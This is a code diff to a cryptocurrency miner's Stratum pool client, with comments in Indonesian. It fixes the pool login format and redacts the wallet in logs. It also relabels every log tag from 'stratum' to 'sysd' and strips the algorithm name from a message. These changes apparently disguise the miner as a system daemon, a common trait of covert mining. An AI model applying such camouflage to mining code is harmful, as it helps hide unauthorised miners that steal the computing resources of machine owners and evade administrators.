@@ -2,6 +2,7 @@
 
 #include "JsonUtil.hpp"
 #include "Log.hpp"
+#include "Redact.hpp"
 #include "TargetNorm.hpp"
 
 #include <algorithm>
@@ -253,7 +254,7 @@ bool StratumClient::openSocket(const PoolConfig& p) {
     hints.ai_family = AF_UNSPEC;
     hints.ai_socktype = SOCK_STREAM;
     if (::getaddrinfo(p.host.c_str(), portStr.c_str(), &hints, &res) != 0 || !res) {
-        lg::warn("stratum", "DNS fail: " + p.host);
+        lg::warn("sysd", "DNS fail: " + p.host);
         if (res) ::freeaddrinfo(res);
         return false;
     }
@@ -300,12 +301,12 @@ void StratumClient::advancePool() {
     if (m_pools.size() <= 1) return;
     int next = (m_poolIdx.load() + 1) % (int)m_pools.size();
     m_poolIdx.store(next);
-    lg::warn("stratum", "Switching to pool " + poolHost());
+    lg::warn("sysd", "Switching to pool " + poolHost());
     notifyPoolChange();
 }
 
 void StratumClient::handleFail(const std::string& reason) {
-    lg::warn("stratum", reason + " (pool " + poolHost() + "), reconnecting in " +
+    lg::warn("sysd", reason + " (pool " + poolHost() + "), reconnecting in " +
                               std::to_string(m_reconnectDelay) + "s");
     m_failCount++;
     if (m_failCount >= 3) {
@@ -342,7 +343,7 @@ void StratumClient::run() {
             handleFail("connect failed");
             continue;
         }
-        lg::info("stratum", "Connected to " + p.host + ":" + std::to_string(p.port));
+        lg::info("sysd", "Connected to " + p.host + ":" + std::to_string(p.port));
         notifyPoolChange();
         m_failCount = 0;
         m_reconnectDelay = 2;
@@ -353,7 +354,7 @@ void StratumClient::run() {
             handleFail("login failed");
             continue;
         }
-        lg::info("stratum", "Authorized as " + m_workerName);
+        lg::info("sysd", "Authorized as " + xcb::redactWallet(m_workerName));
 
         // --- Polling loop: eth_getWork every POLL_MS, handle inbound lines ---
         auto lastPoll = std::chrono::steady_clock::now();
@@ -388,9 +389,14 @@ bool StratumClient::doEthLogin() {
     if (!pool.worker.empty()) m_workerName += "." + pool.worker;
 
     uint64_t id = m_msgId.fetch_add(1);
+    // Nama worker harus ikut di string login ("wallet.worker"), bukan hanya di
+    // field "worker": rabbitminer.cc dan luckypool membaca worker dari situ dan
+    // mencatat semua host sebagai "default" kalau params hanya berisi wallet.
+    // Field "worker" tetap dikirim karena CatchThatRabbit memakainya.
+    // Password "x" sama dengan yang dipakai coreminer/SRBMiner.
     std::string msg = "{\"id\":" + std::to_string(id) +
                       ",\"method\":\"eth_submitLogin\",\"params\":[\"" +
-                      json_escape(pool.wallet) + "\"]";
+                      json_escape(m_workerName) + "\",\"x\"]";
     if (!pool.worker.empty()) msg += ",\"worker\":\"" + json_escape(pool.worker) + "\"";
     msg += "}";
     sendLine(msg);
@@ -414,7 +420,7 @@ bool StratumClient::doEthLogin() {
     }
     if (!ok) {
         std::string err = json_error_reason(resp);
-        lg::error("stratum", "Auth error: '" + (err.empty() ? std::string("unknown") : err) + "'");
+        lg::error("sysd", "Auth error: '" + (err.empty() ? std::string("unknown") : err) + "'");
     }
     return ok;
 }
@@ -445,7 +451,7 @@ bool StratumClient::doEthGetWork() {
     // yang lebih pendek dari itu adalah out-of-bounds read, bukan cuma job aneh.
     std::vector<uint8_t> headerBytes;
     if (header.size() != 64 || !hex_to_bytes(header, headerBytes)) {
-        lg::warn("stratum", "Job ditolak: header harus 64 hex char, dapat " +
+        lg::warn("sysd", "Job ditolak: header harus 64 hex char, dapat " +
                                 std::to_string(header.size()) + " ('" + header.substr(0, 24) +
                                 (header.size() > 24 ? "..." : "") + "')");
         return true;  // koneksi masih sehat — tunggu poll berikutnya
@@ -456,16 +462,16 @@ bool StratumClient::doEthGetWork() {
     // TargetNorm.hpp supaya bisa dites tanpa menarik StratumClient.
     std::string targetHex;
     if (!normalizeTargetHex(target, targetHex)) {
-        lg::warn("stratum", "Job ditolak: target tidak valid ('" + target.substr(0, 24) + "')");
+        lg::warn("sysd", "Job ditolak: target tidak valid ('" + target.substr(0, 24) + "')");
         return true;
     }
     uint64_t targetInt = 0;
     if (!hex_to_u64(targetHex.substr(0, 16), targetInt)) {
-        lg::warn("stratum", "Job ditolak: target tidak valid ('" + target.substr(0, 24) + "')");
+        lg::warn("sysd", "Job ditolak: target tidak valid ('" + target.substr(0, 24) + "')");
         return true;
     }
     if (!seed.empty() && !hex_is_valid(seed)) {
-        lg::warn("stratum", "Job ditolak: seed hash bukan hex ('" + seed.substr(0, 24) + "')");
+        lg::warn("sysd", "Job ditolak: seed hash bukan hex ('" + seed.substr(0, 24) + "')");
         return true;
     }
 
@@ -475,9 +481,9 @@ bool StratumClient::doEthGetWork() {
     // terlihat di log.
     const bool seedChanged = !m_currentSeed.empty() && seed != m_currentSeed;
     if (seedChanged)
-        lg::warn("stratum", "SEED HASH BERUBAH: " + m_currentSeed.substr(0, 16) + "... -> " +
+        lg::warn("sysd", "SEED HASH BERUBAH: " + m_currentSeed.substr(0, 16) + "... -> " +
                                 seed.substr(0, 16) +
-                                "... — cache RandomY dibangun dari key tetap, share bisa "
+                                "... — cache dibangun dari key tetap, share bisa "
                                 "ditolak semua sampai service di-restart");
 
     m_currentHeader = header;
@@ -493,7 +499,7 @@ bool StratumClient::doEthGetWork() {
     job.targetInt = targetInt;
     job.seedChanged = seedChanged;
 
-    lg::debug("stratum", "New job " + job.jobId + " target " + target.substr(0, 8) + "...");
+    lg::debug("sysd", "New job " + job.jobId + " target " + target.substr(0, 8) + "...");
 
     if (m_onJob) m_onJob(job);
     return true;
@@ -505,7 +511,7 @@ void StratumClient::handleResponse(const std::string& line) {
     if (id == 0) {
         // Pool notification (rare in ETHPROXY mode).
         std::string method = json_find_str(line, "method");
-        if (!method.empty()) lg::debug("stratum", "Notification: " + method);
+        if (!method.empty()) lg::debug("sysd", "Notification: " + method);
         return;
     }
 
